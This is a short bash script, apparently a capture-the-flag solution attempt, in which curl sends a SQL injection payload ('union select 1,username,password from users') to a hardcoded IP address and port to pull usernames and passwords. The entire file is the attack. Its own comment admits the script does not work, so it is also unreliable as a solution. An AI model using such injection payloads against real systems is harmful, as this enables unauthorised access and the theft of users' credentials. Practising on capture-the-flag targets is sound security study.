#!/bin/bash

#should work, idk why it doesn't

url='http://141.85.224.118:13000/'

flag=$(curl -s $url -G --data-urlencode 'q=and 0 union select 1,username,password from users #')

echo $flag
